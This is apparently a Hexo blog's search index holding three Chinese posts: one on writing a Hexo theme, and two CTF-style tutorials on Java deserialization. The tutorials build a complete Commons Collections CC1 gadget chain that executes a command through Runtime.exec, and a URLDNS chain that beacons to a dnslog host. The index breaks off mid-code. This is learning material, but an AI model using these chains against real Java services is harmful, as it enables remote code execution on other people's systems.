<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>初探前端世界-Hexo编写主题</title>
      <link href="/posts/e1ce98c7/"/>
      <url>/posts/e1ce98c7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前用久了butterfly的主题发现感觉很不错，于是想简单设计编写一个比较符合自己审美的静态页面，不仅仅作为博客，而是说作为一个自己的个人想法或者介绍的集锦等等。<br>于是在这个假期开始，我用了几天时间从学习到写出了一简单的Demo。他现在作为一个完整应用有些过早，但是用来简单展示是完全足够的。<br>注意，由于我是一个学习前端的新手，而且不会使用各种优秀的前端框架，甚至不明白如何用Nodejs编译，导致我完全只能用CDN的js来进行开发。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>我选择了TailwindCSS和DaisyUI，引用CDN文件之后，在class中添加一些标记来让元素获得CSS样式，可能和BootStrap类似？如果你也想使用这两个库，阅读它们的官方手册来学习他们的用法。</p><ul><li><a href="https://www.tailwindcss.cn/docs/installation">TailwindCSS Docs</a></li><li><a href="https://daisyui.com/docs/install/">DaisyUI Docs</a></li></ul><p>当然，如果不清楚Hexo的主题基本写法，用起来也会很难受，下面这个是Hexo的官方文档和基础方面的简单教程：</p><ul><li><a href="https://blog.csdn.net/smileyan9/article/details/124268248">《Hexo: 从零开始编写自己的主题》</a></li><li><a href="https://hexo.io/zh-cn/docs/">Hexo官方文档</a></li></ul><p>有这四个链接其实就足够了。Hexo的主题主要是对EJS的编写，也就是对于NodeJs的模板语言，如果不需要对脚本的开发，仅仅需要的只是基础语言逻辑。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>接下来就是去构思你想要的结构样式了。这段你需要充分使用hexo的基础文档，比如如何引用一些配置参数、如何去构建标签页、如何构建链接等基础功能。<br>等到这些都可以完成之后，就可以进行一些美化、或者添加一些功能。<br>比如说搜索功能：</p><blockquote><p><a href="https://www.jianshu.com/p/685bf59cde5e">https://www.jianshu.com/p/685bf59cde5e</a></p></blockquote><p>fancyBox功能、Markdown渲染等等，Fancybox前面的连接中有提到如何解决，但是Markdown渲染是一个问题，我选择的方案是让DaisyUI的库来转换而不是Hexo的库，然后让前端js来修改渲染，这也就导致了页面的访问速度本身就慢，再加上渲染速度，使用起来效果很差。但勉强也算解决了问题。<br>然后解决了基础问题之后就要可以来添加一些美化：<br>比如设计一个你喜欢的首页：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706687979978-370a48a2-cf55-4afc-94f2-7aa85430b58d.png" alt="image.png"><br>如果你仔细查看了DaisyUI，会发现有一个简单、直接的切换主题的方式。来方便你选择颜色。甚至支持自定义颜色。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688120249-92f15864-c0a8-4315-8389-64079e7012c0.png" alt="image.png"><br>设计你的个人介绍页面。（参考了最近比较火的Bento风格），我甚至花了一天时间用我本没多少的美术能力花了个像素风格的Furriran。但是其实可以一眼才看出来原作是ai。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688224196-86ceb838-13ff-443b-811f-24f9187c2efb.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688206553-62c5be49-cb26-476e-8b3a-46119f72a006.png" alt="image.png"><br>以及一个简单的导航和友链页面：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688292983-c489b5d6-852c-4841-8c3d-f26d1f076621.png" alt="image.png"><br>等等。这仅仅只需要你有简单的Tailwindcss基础即可，大概两天，你就可以熟练使用它。<br>你可以访问：<a href="https://blog.natro92.fun/">https://blog.natro92.fun</a> 来查看它的Demo。<br>我把这个主题叫做Lupas，因为我更喜欢它的黑色模式。<br>搭建的时候可以尝试使用Vercel来搭建静态页面替代Github Pages。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>即使是设计了很久，想了很多，但是由于自身的能力限制，以及作为一个新手，我并不能完成我自己的设想，想象的实际上的结果并不完全相同，再加上设计能力本身的缺失和一些技术的缺少，比如手机端的显示、一些动画效果等等，如果有时间我会逐渐补全完善它的。</p>]]></content>
      
      
      <categories>
          
          <category> Lupas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Lupas </tag>
            
            <tag> Hexo主题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之CC1</title>
      <link href="/posts/ac1fd128/"/>
      <url>/posts/ac1fd128/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是CC链"><a href="#什么是CC链" class="headerlink" title="什么是CC链"></a>什么是CC链</h1><p>CC（Common Collections）是Java中常用的集合框架之一，它提供了一组常见的容器类，如ArrayList、HashMap等。然而，CC链（CC chain）是指利用Common Collections框架中的漏洞来构建的一种攻击链。</p><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><blockquote><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?t=690.4">https://www.bilibili.com/video/BV1no4y1U7E1?t=690.4</a></p></blockquote><blockquote><p>java版本：8u65<br>既然都是cc链了，肯定要有cc依赖，cc版本是3.2.1</p></blockquote><p>依赖：</p><pre class="language-java" data-language="java"><code class="language-java">&lt;dependencies&gt;    &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;commons-collections&#x2F;commons-collections --&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;        &lt;version&gt;3.2.1&lt;&#x2F;version&gt;    &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>起点：CC下的Transformer。</p><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>我们使用<code>ctrl</code> + <code>alt</code> + <code>b</code> 查看实现的类。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705930832668-bead987b-ff31-4ff8-9bc2-bce8b55edc1f.png" alt="image.png"><br>其中我们要用的是InvokerTransformer中的transform。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705931285463-fdbb8ed9-436f-414e-be7d-db4f2b0ce4cc.png" alt="image.png"><br>能注意到有任意代码执行的反射调用。<br>但在此之前我们要知道，任意命令执行，我们应该在哪里执行命令：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705931096635-402d203b-aaaf-4496-a3c4-b2785cbc8eae.png" alt="image.png"></p><pre class="language-java" data-language="java"><code class="language-java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>有了这个，我们再改成反射调用的格式。<br>注意：打出<code>Runtime.getRuntime();</code>点击<code>alt</code>+<code>enter</code>就可以自动补全。<br>改成普通反射的写法：</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 改成反射Runtime runtime &#x3D; Runtime.getRuntime();Class aClass &#x3D; runtime.getClass();Method exec &#x3D; aClass.getMethod(&quot;exec&quot;, String.class);exec.invoke(runtime, &quot;calc&quot;);</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705932293786-fd6f750f-3a4f-4d2e-8e77-20878d2a7d7f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705932493227-55db672f-aa68-4be7-a7da-28eff4388c91.png" alt="image.png"><br>然后按照InvokerTransformer实例化和transform执行的所需参数填入内容（重新实现这个反射）：</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 改成所需的语句格式        Runtime runtime &#x3D; Runtime.getRuntime();        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</code></pre><p>然后我们需要找到如何才能调用这里，快捷键<code>ctrl</code> + <code>shift</code> + <code>alt</code> + <code>F7</code>查询方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705933367728-2ebd4a89-d300-4cfe-b2b8-866358b01eb0.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705933394856-7752214f-cd8a-4140-8757-f926fd8c357c.png" alt="image.png"><br>通过这种方式来找到所需要的上一个方法。<br>最后找到TransformedMap中的decorate方法来赋值。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934864335-12f317ff-d374-46f2-aec0-d410564a7a02.png" alt="image.png"><br>想实现这个函数，查看其实例化方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934898558-5120148f-7bd6-4ba2-a25f-d8630318220b.png" alt="image.png"><br>并有其赋值decorate方法：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934935808-cdf32594-903e-4a6e-8453-101bcd9f9612.png" alt="image.png"><br>就是说要让其中的valueTransformer是执行的transfrom的InvokerTransformer。<br>于是可以编写出代码：</p><pre class="language-java" data-language="java"><code class="language-java">InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);&#x2F;&#x2F; * 往回找，直到能readObjectHashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();&#x2F;&#x2F; * keyTransformer没用TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);</code></pre><p>这样写就可以调用transform方法。<br>然后再找如何能调用checkSetValue方法，查找之后发现只有一处AbstractInputCheckedMapDecorator：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705935326866-06c8fe4b-378a-41bf-9814-8a081d710702.png" alt="image.png"><br>可以发现这个类是TransformedMap类的父类，其中的MapEntry的setValue调用了这个方法。<br>而遍历Map的一种写法是：</p><pre class="language-java" data-language="java"><code class="language-java">for (Map.Entry entry : objectObjectHashMap.entrySet()) &#123;    entry.setValue();&#125;</code></pre><p>这样就能调用到其中的setValue方法。<br>其中setValue中传入runtime参数即可运行。<br>然后就是继续找，如果有readObject下的调用就直接使用。<br>找到AnnotationInvocationHandler的readObject方法下setValue方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705936486495-54eb0a5c-5872-4f35-b272-35d958616cc1.png" alt="image.png"><br>但由于实例化方法不是public，因此只能在包内调用，也就是说只能用反射来调用。</p><pre class="language-java" data-language="java"><code class="language-java">Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        &#x2F;&#x2F; * 获取构造器        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        Object object &#x3D; declaredConstructor.newInstance(Override.class, decorate);        serialize(object);        deserialize(&quot;ser.bin&quot;);</code></pre><p>最后再加上序列化和反序列化：</p><pre class="language-java" data-language="java"><code class="language-java">public static void serialize(Object object) throws Exception &#123;        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(object);    &#125;    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; objectInputStream.readObject();        return obj;    &#125;</code></pre><p>但还有问题，第一个是setValue的那个传入值是不可以控制的，第二个则是Runtime是不可以被序列化的。</p><h2 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h2><p>先解决如何使用Runtime。<br>虽然，runtime不可以被序列化，但是它的class可以，于是可以写出：</p><pre class="language-java" data-language="java"><code class="language-java">Class&lt;Runtime&gt; runtimeClass &#x3D; Runtime.class;Method getRuntime &#x3D; runtimeClass.getMethod(&quot;getRuntime&quot;, null);Runtime runtime &#x3D; (Runtime) getRuntime.invoke(null, null);Method exec &#x3D; runtimeClass.getMethod(&quot;exec&quot;, String.class);exec.invoke(runtime, &quot;calc&quot;);</code></pre><p>然后改成InvokeTransformer的版本：</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 将格式改为InvokeTransformer        Method runtimeMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);        Runtime runtime &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(runtimeMethod);        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</code></pre><p>可以使用chainedTransformer简化：</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 可以使用chainedTransformer来简化，递归调用        Transformer[] transformers &#x3D; new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</code></pre><h2 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h2><p>然后就需要断点调试。<br>给AnnotationInvocationHandler这里打上断点。看看是否能进去。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939191441-a493fdc7-d20f-44f5-aef3-febbd728a102.png" alt="image.png"><br>我们可以注意到，由于memberType是空我们无法进入：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939559083-da3bb388-4cfc-45d3-b7ff-dd00695fbf70.png" alt="image.png"><br>我们需要找到一个有成员方法的class。key改为名字<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939655388-68696c21-c07d-4780-a005-5e780a5c4578.png" alt="image.png"><br>这里没有key这个参数，target中有value这个参数。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939972031-58306759-e75b-4dce-af16-1298cf4f331f.png" alt="image.png"><br>我们改成value试一试，然后将注释改为target。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939746270-68bee3a5-466c-4f45-a463-df5f0b92d95a.png" alt="image.png"><br>再次断点。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939843986-8bd3c43b-330a-444d-b3ff-1c1c9e07a0c3.png" alt="image.png"><br>但是无法修改最后的value的值，可以使用其中的ConstantTransformer来。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940148759-40f884f4-5d23-4c2b-983e-150a967194cf.png" alt="image.png"><br>也就是在这里加一个让他在Runtime.class中。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940194427-5c89c8b2-74e4-4a0f-8174-7d263592bbe4.png" alt="image.png"><br>ConstantTransformer被传入什么，transform之后就会返回什么。</p><p>最后终于可以成功执行了。QWQ<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940366991-87bdcb39-b6ee-46c2-9548-7d5c5c4905ca.png" alt="image.png"><br>完整代码：</p><pre class="language-java" data-language="java"><code class="language-java">package fun.natro92;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1 &#123;    public static void serialize(Object object) throws Exception &#123;        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(object);    &#125;    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; objectInputStream.readObject();        return obj;    &#125;    public static void main(String[] args) throws Exception &#123;        &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;calc&quot;);        &#x2F;&#x2F; * 改成反射        &#x2F;&#x2F; Runtime runtime &#x3D; Runtime.getRuntime();        &#x2F;&#x2F; Class aClass &#x3D; runtime.getClass();        &#x2F;&#x2F; Method exec &#x3D; aClass.getMethod(&quot;exec&quot;, String.class);        &#x2F;&#x2F; exec.invoke(runtime, &quot;calc&quot;);        &#x2F;&#x2F; * 改成所需的语句格式        &#x2F;&#x2F; Runtime runtime &#x3D; Runtime.getRuntime();        &#x2F;&#x2F; InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        &#x2F;&#x2F; &#x2F;&#x2F; * Runtime不可序列化，改为class        &#x2F;&#x2F; Class&lt;Runtime&gt; runtimeClass &#x3D; Runtime.class;        &#x2F;&#x2F; Method getRuntime &#x3D; runtimeClass.getMethod(&quot;getRuntime&quot;, null);        &#x2F;&#x2F; Runtime runtime &#x3D; (Runtime) getRuntime.invoke(null, null);        &#x2F;&#x2F; Method exec &#x3D; runtimeClass.getMethod(&quot;exec&quot;, String.class);        &#x2F;&#x2F; exec.invoke(runtime, &quot;calc&quot;);        &#x2F;&#x2F; &#x2F;&#x2F; * 将格式改为InvokeTransformer        &#x2F;&#x2F; Method runtimeMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);        &#x2F;&#x2F; Runtime runtime &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(runtimeMethod);        &#x2F;&#x2F; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);        &#x2F;&#x2F; * 可以使用chainedTransformer来简化，递归调用        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        &#x2F;&#x2F; chainedTransformer.transform(Runtime.class);        &#x2F;&#x2F; * 往回找，直到能readObject        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        objectObjectHashMap.put(&quot;value&quot;, &quot;value&quot;);        &#x2F;&#x2F; * keyTransformer没用        Map&lt;Object, Object&gt; decorate &#x3D; TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);        &#x2F;&#x2F; for (Map.Entry entry:decorate.entrySet())&#123;        &#x2F;&#x2F;     entry.setValue(runtime);        &#x2F;&#x2F; &#125;        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        &#x2F;&#x2F; * 获取构造器        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        Object object &#x3D; declaredConstructor.newInstance(Target.class, decorate);        serialize(object);        deserialize(&quot;ser.bin&quot;);    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之反射和URLDNS</title>
      <link href="/posts/589ae4b8/"/>
      <url>/posts/589ae4b8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习视频从这里开始看：</p><ul><li>第一部分：<a href="https://www.bilibili.com/video/BV16h411z7o9?t=1105.7&p=2">https://www.bilibili.com/video/BV16h411z7o9?t=1105.7&p=2</a></li><li>第二部分：<a href="https://www.bilibili.com/video/BV16h411z7o9?t=1180.1">https://www.bilibili.com/video/BV16h411z7o9?t=1180.1</a></li></ul><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>这里有几个快捷键，可以记忆一下。<br>比如说查看结构：<code>alt</code>+<code>7</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705911881513-def44fe6-1290-402e-ac72-e5d469dc27b3.png" alt="image.png"><br>查看层次结构：<code>ctrl</code> + <code>H</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705911911141-796d9fcd-ccf9-4b57-8857-99b0c8bbfebf.png" alt="image.png"></p><h1 id="URLDNS-链子构建"><a href="#URLDNS-链子构建" class="headerlink" title="URLDNS 链子构建"></a>URLDNS 链子构建</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>URL有继承Serializable就证明他是可以被序列化的：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912047710-4b30948a-d2c6-494a-b1ad-21456f7223ce.png" alt="image.png"><br>而且需要使用一个较为常见的函数hashCode：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912179145-ba171de9-9986-41de-bff3-dd8b6bf833c2.png" alt="image.png"><br>调用了handler的hashCode函数，<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912277976-1cccbd4c-039a-4cd2-9c20-593fb3f00bad.png" alt="image.png"><br>其中的getHostAddress就会对域名进行解析，然后就可以利用。<br>dnslog生成一个网址来测试。</p><pre class="language-java" data-language="java"><code class="language-java">import java.io.*;import java.net.URL;import java.util.HashMap;public class URLDNS &#123;    static String tarURL &#x3D; &quot;http:&#x2F;&#x2F;qdgj5w.dnslog.cn&quot;;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;    public static void main(String[] args) throws Exception&#123;        HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();        URL url &#x3D; new URL(tarURL);        hashMap.put(url, 1);        serialize(hashMap);    &#125;&#125;</code></pre><p>正常来说当运行 main 函数时不会访问URL，但实际上运行的结果是会访问URL的。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913035776-ba8b7b09-5761-4a22-ad4c-b150a34bc108.png" alt="image.png"><br>为什么呢，因为HashMap的put方法中就已经调用了hashCode函数：</p><pre class="language-java" data-language="java"><code class="language-java">public V put(K key, V value) &#123;        return putVal(hash(key), key, value, false, true);&#125;</code></pre><p>其中的hash()：</p><pre class="language-java" data-language="java"><code class="language-java">static final int hash(Object key) &#123;        int h;        return (key &#x3D;&#x3D; null) ? 0 : (h &#x3D; key.hashCode()) ^ (h &gt;&gt;&gt; 16);    &#125;</code></pre><p>hashCode会被初始化设定为-1.<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913461604-8214e6ce-89b4-45b9-8904-d4fd859ae638.png" alt="image.png"><br>如果在put方法中执行一次，导致其不再是-1，就无法进入后面的handler的hashCode。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913412666-b77e9157-9983-4d30-a486-139748902adc.png" alt="image.png"><br>这就会导致不执行handler的hashCode。<br>也就是：</p><pre class="language-java" data-language="java"><code class="language-java">设定 hashCode &#x3D; -1↓hashmap.put(url, 1);↓hashcode &#x3D; url的hashCode</code></pre><p>无法在serialize中触发。<br>我们可以测试一下在发序列化中是否触发：</p><pre class="language-java" data-language="java"><code class="language-java">class Deserialize &#123;    static String filename &#x3D; &quot;ser.bin&quot;;    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; objectInputStream.readObject();        return obj;    &#125;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        deserialize(filename);    &#125;&#125;</code></pre><p>运行之后并没有收到请求。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705914084629-ec29f1ac-515a-482d-8d34-a5f827f99fd7.png" alt="image.png"><br>也就是说我们目前的问题就变成了：</p><pre class="language-java" data-language="java"><code class="language-java">HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();        &#x2F;&#x2F; * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求        URL url &#x3D; new URL(tarURL);        hashMap.put(url, 1);        &#x2F;&#x2F; * 在这里将hashCode改回-1        serialize(hashMap);</code></pre><p>其中这里将hashCode改回1就用到了反射，那反射是什么呢？</p><h2 id="正射和反射"><a href="#正射和反射" class="headerlink" title="正射和反射"></a>正射和反射</h2><p>要想知道什么是反射，那就要先了解什么是正射：</p><pre class="language-java" data-language="java"><code class="language-java">Player boogipop &#x3D; new Player();boogipop.playGame(&quot;GENSHIN&quot;);</code></pre><p>也就是先实例化对象，然后对对象进行操作。<br>而反射与正射不同，比如你并不知道原来所实例化的对象是什么。</p><pre class="language-java" data-language="java"><code class="language-java">Class class1 &#x3D; boogipop.getClass();Method method1 &#x3D; class1.getMethod(&quot;playGame&quot;, String.class);Constructor constructor &#x3D; class1.getConstructor();Object object &#x3D; constructor.newInstance();method1.invoke(object, &quot;GENSHIN&quot;);</code></pre><p>示例代码：</p><pre class="language-java" data-language="java"><code class="language-java">class ReflectionTest &#123;    public static void main(String[] args) &#123;        Person person &#x3D; new Person();        Class c &#x3D; person.getClass();        &#x2F;&#x2F; * 反射就是对Class进行操作        &#x2F;&#x2F; * 从抽象类Class中实例化对象        &#x2F;&#x2F; c.newInstance();        &#x2F;&#x2F; * 获取构造器 比如需要传入什么参数        Constructor constructor &#x3D; c.getConstructor(String.class, int.class);        &#x2F;&#x2F; * 传入参数，生成对象        Person person &#x3D; (Person) constructor.newInstance(&quot;Boogipop&quot;, 6);        System.out.println(person);        &#x2F;&#x2F; * 获取参数        Field[] personFields &#x3D; c.getFields();        &#x2F;&#x2F; * 获取所有参数 包括private protected等        Field[] personFields1 &#x3D; c.getDeclaredFields();        for (Field f:personFields)&#123;            System.out.println(f);        &#125;        &#x2F;&#x2F; * 根据变量名获取        Field nameField &#x3D; c.getField(&quot;name&quot;);        &#x2F;&#x2F; * 允许访问        nameField.setAccessible(true);        nameField.set(person, &quot;Berial&quot;);        System.out.println(person);        &#x2F;&#x2F; * 调用方法        Method[] method &#x3D; c.getMethods();        for (Method method1:method)&#123;            System.out.println(method1);        &#125;        &#x2F;&#x2F; * 获取方法        Method actionMethod &#x3D; c.getMethod(&quot;playGame&quot;, String.class);        &#x2F;&#x2F; * 执行方法        actionMethod.invoke(person, &quot;GENSHIN&quot;);    &#125;&#125;</code></pre><h2 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h2><p>知道了反射，就可以使用反射修改其中的hashCode。<br>也就是这样：</p><pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) throws Exception&#123;    HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();    &#x2F;&#x2F; * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求    &#x2F;&#x2F; * 如果hashCode已经是-1了就不会发起请求    URL url &#x3D; new URL(tarURL);    Class c &#x3D; url.getClass();    Field hashCode &#x3D; c.getDeclaredField(&quot;hashCode&quot;);    hashCode.setAccessible(true);    &#x2F;&#x2F; 随便赋值一个不是-1就行    hashCode.set(url, 1);    hashMap.put(url, 1);    &#x2F;&#x2F; * 在这里将hashCode改回-1    hashCode.set(url, -1);    serialize(hashMap);&#125;</code></pre><p>在反序列化之后我们才收到请求：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705918481578-104f0ce8-3145-4649-9786-3f06e25186dc.png" alt="image.png"><br>完整代码：</p><pre class="language-java" data-language="java"><code class="language-java">import java.io.*;import java.lang.reflect.*;import java.net.URL;import java.util.Base64;import java.util.HashMap;public class URLDNS &#123;    &#x2F;&#x2F; * 记得去掉后面的&#x2F;    static String tarURL &#x3D; &quot;http:&#x2F;&#x2F;test&quot;;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;    public static void main(String[] args) throws Exception&#123;        HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();        &#x2F;&#x2F; * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求        &#x2F;&#x2F; * 如果hashCode已经是-1了就不会发起请求        URL url &#x3D; new URL(tarURL);        Class c &#x3D; url.getClass();        Field hashCode &#x3D; c.getDeclaredField(&quot;hashCode&quot;);        hashCode.setAccessible(true);        &#x2F;&#x2F; 随便赋值一个不是-1就行        hashCode.set(url, 1);        hashMap.put(url, 1);        &#x2F;&#x2F; * 在这里将hashCode改回-1        hashCode.set(url, -1);        serialize(hashMap);    &#125;&#125;class Deserialize &#123;    static String filename &#x3D; &quot;ser.bin&quot;;    public static Object deserialize(String 